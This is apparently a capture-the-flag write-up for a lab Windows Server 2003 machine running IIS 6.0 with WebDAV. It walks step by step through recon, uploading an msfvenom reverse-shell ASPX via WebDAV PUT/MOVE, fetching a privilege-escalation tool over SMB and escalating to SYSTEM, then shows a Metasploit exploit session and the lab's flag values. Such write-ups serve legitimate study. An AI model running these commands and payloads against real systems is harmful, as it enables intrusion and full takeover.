![image](https://user-images.githubusercontent.com/105310322/187503546-48a4c7be-f47c-41b5-ade8-a6df645169bd.png)

### Tools: nmap, cadaver, davtest, msfvenom

### Vulnerabilities: IIS, WebDAV, SeImpersonatePrivilege

Nmap shows us 1 port open running IIS 6.0. Also the webdav scan shows a couple of different commands that can be used. Sounds spicy.

```console
└──╼ [★]$ sudo nmap -sC -A -O 10.129.162.7
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-16 18:12 BST
Nmap scan report for 10.129.162.7
Host is up (0.0075s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
|_http-title: Under Construction
| http-methods: 
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
|_http-server-header: Microsoft-IIS/6.0
| http-webdav-scan: 
|   Server Type: Microsoft-IIS/6.0
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|   Server Date: Tue, 16 Aug 2022 17:13:00 GMT
|_  WebDAV type: Unknown
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2003|2008|XP|2000 (92%)
OS CPE: cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_server_2008::sp2 cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_2000::sp4
Aggressive OS guesses: Microsoft Windows Server 2003 SP1 or SP2 (92%), Microsoft Windows Server 2008 Enterprise SP2 (92%), Microsoft Windows Server 2003 SP2 (91%), Microsoft Windows 2003 SP2 (91%), Microsoft Windows XP SP3 (90%), Microsoft Windows 2000 SP4 or Windows XP Professional SP1 (90%), Microsoft Windows XP (87%), Microsoft Windows Server 2003 SP1 - SP2 (86%), Microsoft Windows XP SP2 or Windows Server 2003 (86%), Microsoft Windows XP SP2 or SP3 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   12.52 ms 10.10.14.1
2   11.77 ms 10.129.162.7

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.86 seconds
```
Dirb gave some stuff back including an aspnet client but actually going to webpage did not give anything fruitful.

```console
└──╼ [★]$ dirb http://10.129.162.7

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Aug 16 18:14:23 2022
URL_BASE: http://10.129.162.7/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.129.162.7/ ----
==> DIRECTORY: http://10.129.162.7/_private/                                   
==> DIRECTORY: http://10.129.162.7/_vti_bin/                                   
+ http://10.129.162.7/_vti_bin/_vti_adm/admin.dll (CODE:200|SIZE:195)          
+ http://10.129.162.7/_vti_bin/_vti_aut/author.dll (CODE:200|SIZE:195)         
+ http://10.129.162.7/_vti_bin/shtml.dll (CODE:200|SIZE:96)                    
==> DIRECTORY: http://10.129.162.7/_vti_log/                                   
==> DIRECTORY: http://10.129.162.7/aspnet_client/                              
==> DIRECTORY: http://10.129.162.7/images/                                     
==> DIRECTORY: http://10.129.162.7/Images/                                     
                                                                               
-----------------
END_TIME: Tue Aug 16 18:14:40 2022
DOWNLOADED: 4612 - FOUND: 3
```
With the above info that gives us some information on what to do next. Metasploit can be used for an easy reverse shell with iis webdav but I decided to use a manual method to learn more.

So we are going to start with davtest to see what kind of files can be uploaded to the system. We get a few success's but for an exploit to work correctly we need to use aspx. Luckily the previous nmap scan showed that we can use MOVE. This means all we have to do is upload our exploit as a txt file and then MOVE it to an aspx file.


Note: PWNbox definitley has issues with certain things. My metasploit shell and the webpage were doing fine but when I ran davtest and cadaver I was not getting anything back. A hard reset on the instance fixed this issue... for now...
```console
└──╼ [★]$ davtest -url http://10.129.95.234
********************************************************
 Testing DAV connection
OPEN		SUCCEED:		http://10.129.95.234
********************************************************
NOTE	Random string for this session: XQntDZ8jAKbY
********************************************************
 Creating directory
MKCOL		SUCCEED:		Created http://10.129.95.234/DavTestDir_XQntDZ8jAKbY
********************************************************
 Sending test files
PUT	cgi	FAIL
PUT	cfm	SUCCEED:	http://10.129.95.234/DavTestDir_XQntDZ8jAKbY/davtest_XQntDZ8jAKbY.cfm
PUT	txt	SUCCEED:	http://10.129.95.234/DavTestDir_XQntDZ8jAKbY/davtest_XQntDZ8jAKbY.txt
PUT	asp	FAIL
PUT	php	SUCCEED:	http://10.129.95.234/DavTestDir_XQntDZ8jAKbY/davtest_XQntDZ8jAKbY.php
PUT	shtml	FAIL
PUT	jsp	SUCCEED:	http://10.129.95.234/DavTestDir_XQntDZ8jAKbY/davtest_XQntDZ8jAKbY.jsp
PUT	html	SUCCEED:	http://10.129.95.234/DavTestDir_XQntDZ8jAKbY/davtest_XQntDZ8jAKbY.html
PUT	jhtml	SUCCEED:	http://10.129.95.234/DavTestDir_XQntDZ8jAKbY/davtest_XQntDZ8jAKbY.jhtml
PUT	pl	SUCCEED:	http://10.129.95.234/DavTestDir_XQntDZ8jAKbY/davtest_XQntDZ8jAKbY.pl
PUT	aspx	FAIL
********************************************************
 Checking for test file execution
EXEC	cfm	FAIL
EXEC	txt	SUCCEED:	http://10.129.95.234/DavTestDir_XQntDZ8jAKbY/davtest_XQntDZ8jAKbY.txt
EXEC	php	FAIL
EXEC	jsp	FAIL
EXEC	html	SUCCEED:	http://10.129.95.234/DavTestDir_XQntDZ8jAKbY/davtest_XQntDZ8jAKbY.html
EXEC	jhtml	FAIL
EXEC	pl	FAIL

********************************************************
/usr/bin/davtest Summary:
Created: http://10.129.95.234/DavTestDir_XQntDZ8jAKbY
PUT File: http://10.129.95.234/DavTestDir_XQntDZ8jAKbY/davtest_XQntDZ8jAKbY.cfm
PUT File: http://10.129.95.234/DavTestDir_XQntDZ8jAKbY/davtest_XQntDZ8jAKbY.txt
PUT File: http://10.129.95.234/DavTestDir_XQntDZ8jAKbY/davtest_XQntDZ8jAKbY.php
PUT File: http://10.129.95.234/DavTestDir_XQntDZ8jAKbY/davtest_XQntDZ8jAKbY.jsp
PUT File: http://10.129.95.234/DavTestDir_XQntDZ8jAKbY/davtest_XQntDZ8jAKbY.html
PUT File: http://10.129.95.234/DavTestDir_XQntDZ8jAKbY/davtest_XQntDZ8jAKbY.jhtml
PUT File: http://10.129.95.234/DavTestDir_XQntDZ8jAKbY/davtest_XQntDZ8jAKbY.pl
Executes: http://10.129.95.234/DavTestDir_XQntDZ8jAKbY/davtest_XQntDZ8jAKbY.txt
Executes: http://10.129.95.234/DavTestDir_XQntDZ8jAKbY/davtest_XQntDZ8jAKbY.html

```
1st step is to craft the exploit with msfvenom. be sure to name the exploit with a .txt so we can upload it to the system.

```console
└──╼ [★]$ msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.93 lport=1234 -f aspx -o exploit.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of aspx file: 2728 bytes
Saved as: exploit.aspx
```
Then in cadaver we can use PUT and MOVE to upload and change the file type again.

```console
└──╼ [★]$ cadaver http://10.129.162.7
dav:/> ls
Listing collection `/': succeeded.
Coll:   _private                               0  Apr 12  2017
Coll:   _vti_bin                               0  Apr 12  2017
Coll:   _vti_cnf                               0  Apr 12  2017
Coll:   _vti_log                               0  Apr 12  2017
Coll:   _vti_pvt                               0  Apr 12  2017
Coll:   _vti_script                            0  Apr 12  2017
Coll:   _vti_txt                               0  Apr 12  2017
Coll:   aspnet_client                          0  Apr 12  2017
Coll:   images                                 0  Apr 12  2017
        _vti_inf.html                       1754  Apr 12  2017
        iisstart.htm                        1433  Feb 21  2003
        pagerror.gif                        2806  Feb 21  2003
        postinfo.html                       2440  Apr 12  2017
dav:/> PUT exploit.txt 
Uploading exploit.txt to `/exploit.txt':
Progress: [=============================>] 100.0% of 2728 bytes succeeded.
dav:/> MOVE exploit.txt exploit.aspx
Moving `/exploit.txt' to `/exploit.aspx':  succeeded.
dav:/> 
```
Now we just curl and set up our listener to get a shell back!

```console
curl http://10.129.95.234/exploit.aspx
```
```console
└──╼ [★]$ nc -lvnp 1234
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.129.95.234.
Ncat: Connection from 10.129.95.234:1032.
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>whoami
whoami
nt authority\network service
```

At the moment we do not have enough privileges to do much.
Running a whoami /priv reveals SeImpersonatePrivilege. Thats just sounds bad.

```
C:\Documents and Settings\All Users>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAuditPrivilege              Generate security audits                  Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
```
Before we get started make a temp folder so we can execute some files.

```console
C:\>mkdir temp
mkdir temp

C:\>cd temp
cd temp

C:\temp>
```
This part took me the longest as I tried a couple of different exploits such as Juicypotato and Sweetpotato but ultimately I landed on churrasco that I got from this github. https://github.com/jivoi/pentest/blob/master/exploit_win/churrasco


To get the file on the system we set up our smbserver and then use the Copy command to bring onto the victim system. Earlier I also tried winPeasexe but it crashed my shell. Another option I tried was ```certutil.exe -urlcache -f http://10.10.14.93/winPEASexe``` but that wasn't going through for me.
```console
└──╼ [★]$ sudo impacket-smbserver rogue .
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
```
```console
copy \\10.10.14.93\rogue\churrasco.exe
```

Now we run the program and we get our root shell!

```console
C:\temp>churrasco.exe -d cmd.exe
churrasco.exe -d cmd.exe
/churrasco/-->Current User: NETWORK SERVICE 
/churrasco/-->Getting Rpcss PID ...
/churrasco/-->Found Rpcss PID: 668 
/churrasco/-->Searching for Rpcss threads ...
/churrasco/-->Found Thread: 672 
/churrasco/-->Thread not impersonating, looking for another thread...
/churrasco/-->Found Thread: 676 
/churrasco/-->Thread not impersonating, looking for another thread...
/churrasco/-->Found Thread: 684 
/churrasco/-->Thread impersonating, got NETWORK SERVICE Token: 0x734
/churrasco/-->Getting SYSTEM token from Rpcss Service...
/churrasco/-->Found NETWORK SERVICE Token
/churrasco/-->Found LOCAL SERVICE Token
/churrasco/-->Found SYSTEM token 0x72c
/churrasco/-->Running command with SYSTEM Token...
/churrasco/-->Done, command should have ran as SYSTEM!
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\WINDOWS\TEMP>whoami
whoami

C:\temp>whoami
whoami
nt authority\system

C:\WINDOWS\TEMP>
```

Bada bing bada boom we have full access and can get both flags :)

```console
C:\Documents and Settings\Lakis\Desktop>type user.txt
type user.txt
700c5dc163014e22b3e408f8703f67d1
```
```console
C:\Documents and Settings\Administrator\Desktop>type root.txt
type root.txt
aa4beed1c0584445ab463a6747bd06e9
```

Learned a few new things and I am trying to steer away from metasploit so I can prepare for the OSCP.

As an extra bonus here is the metasploit exploit I orignally used before deciding to do it manually. After grabbing a meterpreter shell you could enumerate more exploits on the system and get a quick root shell. Metasploit is super nice but unfortunately is not allowed on the OSCP.

```console
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > options

Module options (exploit/windows/iis/iis_webdav_scstoragepathfromurl):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   MAXPATHLENGTH  60               yes       End of physical path brute force
   MINPATHLENGTH  3                yes       Start of physical path brute forc
                                             e
   Proxies                         no        A proxy chain of format type:host
                                             :port[,type:host:port][...]
   RHOSTS                          yes       The target host(s), see https://g
                                             ithub.com/rapid7/metasploit-frame
                                             work/wiki/Using-Metasploit
   RPORT          80               yes       The target port (TCP)
   SSL            false            no        Negotiate SSL/TLS for outgoing co
                                             nnections
   TARGETURI      /                yes       Path of IIS 6 web application
   VHOST                           no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thr
                                        ead, process, none)
   LHOST     198.211.116.24   yes       The listen address (an interface may b
                                        e specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Microsoft Windows Server 2003 R2 SP2 x86


msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set lhost 10.10.14.93
lhost => 10.10.14.93
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set rhosts 10.129.162.7
rhosts => 10.129.162.7
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > run

[*] Started reverse TCP handler on 10.10.14.93:4444 
[*] Trying path length 3 to 60 ...
[*] Sending stage (175174 bytes) to 10.129.162.7
[*] Meterpreter session 1 opened (10.10.14.93:4444 -> 10.129.162.7:1034 ) at 2022-08-16 18:37:45 +0100

meterpreter >
```

